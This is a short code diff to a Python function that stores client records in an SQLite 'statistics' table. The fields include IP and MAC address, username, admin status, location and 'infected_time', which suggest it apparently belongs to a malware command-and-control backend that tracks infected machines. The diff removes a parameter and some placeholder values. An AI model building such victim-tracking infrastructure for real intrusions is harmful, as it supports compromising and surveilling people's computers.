@@ -35,12 +35,11 @@ def create_tables():
     connection.close()
 
 
-def insert_statistics_to_database(statistics, client_id):
+def insert_statistics_to_database(statistics):
     """Inserts statistics related to the user into the database. It is invoked when a request comes to /initialise
 
     Args:
         statistics (dict): Dictionary containing various client properties
-        client_id (str): A unique ID for user in UUID4 format
     
     Raises:
         sqlite3.DatabaseError: Exception raised for errors that are related to the database.
@@ -52,9 +51,6 @@ def insert_statistics_to_database(statistics, client_id):
     connection = create_connection()
     cursor = connection.cursor()
     statistics_insert_query = "INSERT INTO `statistics` (client_id, platform, architecture, ip_address, mac_address, device_name, username, is_admin, location, infected_time) VALUES (:client_id, :platform, :architecture, :ip_address, :mac_address, :device_name, :username, :is_admin, :location, :infected_time);"
-    statistics["client_id"] = client_id
-    statistics["ip_address"] = "8.8.8.8"
-    statistics["location"] = "Hogwarts"
     cursor.execute(statistics_insert_query, statistics)
     connection.commit()
     connection.close()
